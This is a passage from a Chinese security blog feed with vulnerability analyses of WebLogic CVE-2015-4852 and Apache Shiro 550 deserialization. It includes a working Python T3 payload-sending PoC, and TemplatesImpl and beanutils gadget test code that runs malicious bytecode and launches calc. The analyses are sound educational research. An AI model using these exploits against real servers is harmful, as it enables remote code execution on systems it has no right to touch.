href="#POC代码" class="headerlink" title="POC代码"></a>POC代码</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-attribute">import</span> socket<br><span class="hljs-attribute">import</span> os<br><span class="hljs-attribute">import</span> sys<br><span class="hljs-attribute">import</span> struct<br><br><span class="hljs-attribute">if</span> len(sys.argv) &lt; <span class="hljs-number">3</span>:<br>    <span class="hljs-attribute">print</span> &#x27;Usage: python %s &lt;host&gt; &lt;port&gt; &lt;/path/to/payload&gt;&#x27; % os.path.basename(sys.argv[<span class="hljs-number">0</span>])<br>    <span class="hljs-attribute">sys</span>.exit()<br><br><span class="hljs-attribute">sock</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-attribute">sock</span>.settimeout(<span class="hljs-number">5</span>)<br><br><span class="hljs-attribute">server_address</span> = (sys.argv[<span class="hljs-number">1</span>], int(sys.argv[<span class="hljs-number">2</span>]))<br><span class="hljs-attribute">print</span> &#x27;[+] Connecting to %s port %s&#x27; % server_address<br><span class="hljs-attribute">sock</span>.connect(server_address)<br><br><span class="hljs-attribute">headers</span>=&#x27;t<span class="hljs-number">3</span> <span class="hljs-number">10</span>.<span class="hljs-number">3</span>.<span class="hljs-number">1</span>\nAS:<span class="hljs-number">255</span>\nHL:<span class="hljs-number">19</span>\n\n&#x27;<br><span class="hljs-attribute">sock</span>.sendall(headers)<br><br><span class="hljs-attribute">data</span> = sock.recv(<span class="hljs-number">1024</span>)<br><br><span class="hljs-attribute">payloadObj</span> = open(sys.argv[<span class="hljs-number">3</span>],&#x27;rb&#x27;).read()<br><br><span class="hljs-attribute">payload</span>=&#x27;\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">09</span>\xe<span class="hljs-number">4</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">65</span>\x<span class="hljs-number">01</span>\xff\xff\xff\xff\xff\xff\xff\xff\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">71</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\xea\x<span class="hljs-number">60</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">18</span>\x<span class="hljs-number">43</span>\x<span class="hljs-number">2</span>e\xc<span class="hljs-number">6</span>\xa<span class="hljs-number">2</span>\xa<span class="hljs-number">6</span>\x<span class="hljs-number">39</span>\x<span class="hljs-number">85</span>\xb<span class="hljs-number">5</span>\xaf\x<span class="hljs-number">7</span>d\x<span class="hljs-number">63</span>\xe<span class="hljs-number">6</span>\x<span class="hljs-number">43</span>\x<span class="hljs-number">83</span>\xf<span class="hljs-number">4</span>\x<span class="hljs-number">2</span>a\x<span class="hljs-number">6</span>d\x<span class="hljs-number">92</span>\xc<span class="hljs-number">9</span>\xe<span class="hljs-number">9</span>\xaf\x<span class="hljs-number">0</span>f\x<span class="hljs-number">94</span>\x<span class="hljs-number">72</span>\x<span class="hljs-number">02</span>\x<span class="hljs-number">79</span>\x<span class="hljs-number">73</span>\x<span class="hljs-number">72</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">78</span>\x<span class="hljs-number">72</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">78</span>\x<span class="hljs-number">72</span>\x<span class="hljs-number">02</span>\x<span class="hljs-number">78</span>\x<span class="hljs-number">70</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">0</span>c\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">02</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">70</span>\x<span class="hljs-number">70</span>\x<span class="hljs-number">70</span>\x<span class="hljs-number">70</span>\x<span class="hljs-number">70</span>\x<span class="hljs-number">70</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">0</span>c\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">02</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">70</span>\x<span class="hljs-number">06</span>\xfe\x<span class="hljs-number">01</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>&#x27;<br><span class="hljs-attribute">payload</span>=payload+payloadObj<br><br><span class="hljs-attribute">payload</span>=struct.pack(&#x27;&gt;I&#x27;,len(payload)) + payload[<span class="hljs-number">4</span>:]<br><br><br><span class="hljs-attribute">print</span> &#x27;[+] Sending payload...&#x27;<br><span class="hljs-attribute">sock</span>.send(payload)<br><span class="hljs-attribute">data</span> = sock.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-attribute">print</span> &gt;&gt;sys.stderr, &#x27;received <span class="hljs-string">&quot;%s&quot;</span>&#x27; % data<br></code></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<code>weblogic/rjvm/InboundMsgAbbrev.class#readObject</code>打下断点</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220315102736186.png"></p><p>这里的var1就是序列化传输的数据，在此中调用了<code>InboundMsgAbbrev.ServerChannelInputStream(var1).readObject()</code>方法</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220315103943442.png"></p><p><code>ServerChannelInputStream</code>类继承了<code>ObjectInputStream</code>，在构造方法中调用了父类的构造方法<br>，在后续调用readObject()方法时，因为没有重写readObject()方法，也调用了<code>ObjectInputStream#readObject()</code>方法</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220315104241730.png"></p><p><code>resolveClass</code>时readObject()中必经的一个方法，序列化数据都会在此方法中流经一次。这个方法的作用就是将类的序列化描述符加工成该类的Class对象，因此很多针对反序列化Gadget的拦截都是通过重写此方法完成的</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220315105012445.png"></p><p>在<code>ServerChannelInputStream</code>类中重写了resolveClass方法，但是直接调用了父类，即<code>ObjectInputStream#resolveClass</code>方法，没有做任何过滤</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220315104446532.png"></p><p>继续执行，就获取了我们精心构造的<code>AnnotationInvocationHandler</code>类，后续流程就步入CC1的试调过程，详情可以移步之前的<a href="http://www.baidu.com/">Common-Collections-1 反序列化利用分析</a></p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-2022031510512672.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文介绍了如何搭建weblogic试调环境，并给出了CVE-2015-4852漏洞分析</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/">http://xxlegend.com/2018/06/20/先知议题 Java反序列化实战 解读/</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Weblogic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro 550 反序列化漏洞分析</title>
    <link href="/2021/12/01/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2021/12/01/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。</p><p>在shiro &lt; 1.2.4的版本中，由于采用了硬编码密钥，攻击者可以构造恶意Cookie，实现反序列化代码执行</p><p>由于其Aes加密特性，可以天然的绕过WAF，因此此漏洞在如今依旧存在。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要讲述以下内容</p><ul><li>环境搭建</li><li>加密过程</li><li>解密过程</li><li>无依赖Payload构造</li><li>有依赖Payload构造</li></ul><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用官方环境</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br>cd ./shiro<br><span class="hljs-comment"># 恢复到shiro-1.2.4版本</span><br>git checkout shiro-root-<span class="hljs-number">1.2</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>修改<code>./shiro/samples/web/pom.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>taglibs<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>standard<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>导入IDEA，环境运行成功</p><h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><h2 id="判断是否勾选RememberMe"><a href="#判断是否勾选RememberMe" class="headerlink" title="判断是否勾选RememberMe"></a>判断是否勾选RememberMe</h2><p>AbstractRememberMeManager.class<br>在onSuccessfulLogin打下断点<br><img src="/img/markdown-img-paste-20211124135829917.png"></p><p>这里isRememberMe是判断是否勾选RememberMe</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>因为已经勾选，所以进入判断调用rememberIdentity方法</p><p><img src="/img/markdown-img-paste-20211124140053979.png"></p><p>这里getIdentityToRemember是返回一个PrincipalCollection对象，里面包含登录信息。</p><p><img src="/img/markdown-img-paste-20211124140739150.png"></p><p>跟进rememberIdentity()</p><p><img src="/img/markdown-img-paste-20211124140438666.png"></p><p>跟进convertPrincipalsToBytes</p><p><img src="/img/markdown-img-paste-2021112414101799.png"></p><p>跟进serialize</p><p><img src="/img/markdown-img-paste-20211124141048316.png"></p><p>DefaultSerializer.java</p><p>跟进serialize</p><p><img src="/img/markdown-img-paste-20211124141301550.png"></p><p>跟进writeObject</p><p><img src="/img/markdown-img-paste-20211124141425692.png"></p><p>最后在baos.toByteArray()返回字符码</p><p><img src="/img/markdown-img-paste-2021112414165094.png"></p><h2 id="加密-1"><a href="#加密-1" class="headerlink" title="加密"></a>加密</h2><p>这里getCipherService()返回一个AesCipherService对象</p><p><img src="/img/markdown-img-paste-20211124142104675.png"></p><p>进入判断<br>跟进encrypt()</p><p><img src="/img/markdown-img-paste-20211124142229167.png"></p><p>这里存在代码</p><p><code>ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</code></p><p>serialized根据判断是之前的序列化字符串</p><p>跟进getEncryptionCipherKey()</p><p><img src="/img/markdown-img-paste-20211124142620925.png"></p><p>返回Aes密钥，这里的密钥是多久生成的呢？<br>查看构造函数</p><p><img src="/img/markdown-img-paste-20211124142727535.png"></p><p>有一个setCipherKey方法， 参数为DEFAULT_CIPHER_KEY_BYTES</p><p>参数为DEFAULT_CIPHER_KEY_BYTES可以找到，为硬编码的值</p><p><img src="/img/markdown-img-paste-20211124142830686.png"></p><p>setCipherKey中含有setEncryptionCipherKey方法</p><p><img src="/img/markdown-img-paste-20211124142853201.png"></p><p>setEncryptionCipherKey方法中设置了encryptionCipherKey的值</p><p><img src="/img/markdown-img-paste-20211124142932111.png"></p><p>进入encrypt()函数</p><p>JcaCipherService.java</p><p><img src="/img/markdown-img-paste-20211124143104894.png"></p><p>跟进，后面是Aes加密过程</p><p><img src="/img/markdown-img-paste-20211124143220579.png"></p><p>最终返回加密bytes</p><h2 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h2><p>跟进rememberSerializedIdentity()方法</p><p><img src="/img/markdown-img-paste-20211124143450816.png"></p><p>在154行存在base64加密操作</p><p><code>String base64 = Base64.encodeToString(serialized);</code></p><p>最后将其值保存至cookie中</p><p>整个流程完成</p><h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><h2 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h2><p>在DefaultSecurityManager.class中的getRememberedIdentity()方法打入断点</p><p><img src="/img/markdown-img-paste-20211124144543923.png"></p><p>跟进AbstractRememberMeManager.class的getRememberedPrincipals方法</p><p><img src="/img/markdown-img-paste-20211124144607425.png"></p><p>跟进getRememberedSerializedIdentity方法</p><p><img src="/img/markdown-img-paste-20211124144709651.png"></p><p>其中关键代码</p><p><code>String base64 = getCookie().readValue(request, response);</code></p><p>获得Cookie中的base64加密字符</p><p>在后续操作中，进行base64解密</p><h2 id="Aes解密"><a href="#Aes解密" class="headerlink" title="Aes解密"></a>Aes解密</h2><p>返回getRememberedPrincipals方法，跟进convertBytesToPrincipals方法</p><p><img src="/img/markdown-img-paste-20211124145113592.png"></p><p>进入decrypt()操作</p><p><img src="/img/markdown-img-paste-20211124145141585.png"></p><p>其中getDecryptionCipherKey()跟加密操作一样</p><p>最终返回解密后的字符串</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>跟进deserialize()</p><p><img src="/img/markdown-img-paste-20211124145345395.png"></p><p>跟进DefaultSerializer.class的deserialize方法</p><p><img src="/img/markdown-img-paste-20211124145427428.png"></p><p>最终在</p><p><code>T deserialized = (T) ois.readObject();</code></p><p>实现了反序列化</p><h2 id="ClassResolvingObjectInputStream"><a href="#ClassResolvingObjectInputStream" class="headerlink" title="ClassResolvingObjectInputStream"></a>ClassResolvingObjectInputStream</h2><p>这里跟进一下ClassResolvingObjectInputStream方法</p><p><img src="/img/markdown-img-paste-20211124145750467.png"></p><p>这里重写了resolveClass，关键实现变为<code>ClassUtils.forName(osc.getName());</code></p><p>跟进一下</p><p><img src="/img/markdown-img-paste-20211124150329381.png"></p><p>发现使用了Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);来加载类</p><p>而ClassLoader.loadClass不支持装载数组类型的class，因为我们cc链都是构造ChainedTransformer数组来实现，因此有一些cc链无法使用</p><h1 id="无依赖payload构造"><a href="#无依赖payload构造" class="headerlink" title="无依赖payload构造"></a>无依赖payload构造</h1><p>在shiro原生依赖中，是没有commons-collections库的，但是却依赖了commons-beanutils库</p><h2 id="commons-beanutils"><a href="#commons-beanutils" class="headerlink" title="commons-beanutils"></a>commons-beanutils</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。</p><h3 id="PropertyUtils-getProperty"><a href="#PropertyUtils-getProperty" class="headerlink" title="PropertyUtils.getProperty"></a>PropertyUtils.getProperty</h3><p>PropertyUtils.getProperty(Object bean, String name)</p><ul><li>bean 是不为null的Java Bean实例</li><li>name 是Java Bean属性名称 (也就是方法中的getXxx(), setXxx(), 其中的xxx成为这个java bean的bean属性, java中的类成员变量称为字段, 并不是属性。</li></ul><p>这个方法的作用是调用bean对象中, 中的getname()方法</p><p>示例<br>Cat.java</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino">package com.javasec.shiro;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> &#123;</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> name = <span class="hljs-string">&quot;catalina&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span> throws Exception</span>&#123;<br>        Runtime.<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(<span class="hljs-keyword">String</span> name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Test.java</p><p><code>PropertyUtils.getProperty(new Cat(),&quot;name&quot;);</code><br>可以调用Cat.getName()方法</p><p>简而言之，这个方法实现了一个自动调用，可以自动调用参数一里的get参数二方法。</p><h3 id="BeanComparator-compare"><a href="#BeanComparator-compare" class="headerlink" title="BeanComparator.compare"></a>BeanComparator.compare</h3><p><img src="/img/markdown-img-paste-20211125161126989.png"></p><p>BeanComparator.compare传入了两个参数，如果this.property为空，则直接比较这两个对象；如果this.property不为空，则用PropertyUtils.getProperty分别取这两个对象的this.property属性，比较属性的值。</p><p>如果我们控制this.property的值，让它不为空且为特定值，就可以去调用特定的方法了</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>ClassLoader是⼀个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime</p><p>ClassLoader 处理字节码的流程为 loadClass -&gt; findClass -&gt; defineClass</p><ul><li>loadClass: 从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass</li><li>​ findClass: 根据基础URL指定的方式来加载类的字节码</li><li>defineClass：处理前面传入的字节码，将其处理成真正的Java类</li></ul><p>查看defineClass源码</p><p><img src="/img/markdown-img-paste-20211125170958504.png"></p><p>可以看到，该方法是一个保护方法，只能通过反射调用，不具有实战价值</p><h3 id="TransletClassLoader"><a href="#TransletClassLoader" class="headerlink" title="TransletClassLoader"></a>TransletClassLoader</h3><p>TemplatesImpl 类中有一个内部类 TransletClassLoader，重写了 defineClass方法，同时没有显示的声明其定义域。</p><p>Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</p><p><img src="/img/markdown-img-paste-20211125171427472.png"></p><p>由于是内部类，TransletClassLoader只允许TemplatesImpl类进行调用</p><p>因此需要查找TemplatesImpl中TransletClassLoader的调用情况</p><h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h3><p>在defineTransletClasses中存在TransletClassLoader的调用</p><p><img src="/img/markdown-img-paste-20211125172038696.png"></p><p>分析代码，这里对_bytecodes的值进行判断，如果为空则退出，因此_bytecodes需要进行赋值</p><p>后面存在一个_tfactory.getExternalExtensionsMap()的调用<br>getExternalExtensionsMap()是TransformerFactoryImpl.class的一个方法，因此_tfactory的值应为一个TransformerFactoryImpl对象</p><p>继续分析，走到后门，发现一个loader.defineClass(_bytecodes[i])，而参数的值正好为_bytecodes中的值，如果控制_bytecodes中的值为一个恶意字节码类，就可以实现任意代码执行</p><p><img src="/img/markdown-img-paste-20211126142856556.png"></p><p>但由于其是私有方法，不能直接调用，因此还需要找defineTransletClasses的调用情况</p><p>查找情况如下</p><ul><li>private</li><li>getTransletInstance</li><li>getTransletClasses</li><li>public</li><li>getTransletIndex</li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>调用getTransletIndex方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> Test &#123;<br>    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;<br>        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;<br>        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>        field.set(obj, value);<br>    &#125;<br><br>    public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClass</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>        <span class="hljs-comment">//setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);</span><br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br>        templates.get<span class="hljs-constructor">TransletIndex()</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功运行，但没有结果，我们可以看一看getTransletIndex方法</p><p><img src="/img/markdown-img-paste-20211126103049844.png"></p><p>它调用了defineTransletClasses，但却没有对其进行初始化</p><p>为了验证以下，我们对getTransletClasses方法进行测试</p><p><img src="/img/markdown-img-paste-2021112610452128.png"></p><p>此方法调用了defineTransletClasses，同时返回了加载的类</p><p>测试代码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;<br>    Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;<br>    field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    field.set(obj, value);<br>&#125;<br><br>public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClass</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>    <span class="hljs-comment">//setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);</span><br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br>    <span class="hljs-comment">//templates.getTransletIndex();</span><br>    Method <span class="hljs-keyword">method</span> = templates.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;getTransletClasses&quot;</span>)</span>;<br>    <span class="hljs-keyword">method</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    Class<span class="hljs-literal">[]</span> cls = (Class<span class="hljs-literal">[]</span>) <span class="hljs-keyword">method</span>.invoke(templates,<span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;&#125;);<br>    cls<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果是成功弹出计算器</p><p>因此我们需要找newInstance()方法</p><p>最终在getTransletInstance中，同时存在defineTransletClasses和newInstance的调用</p><p><img 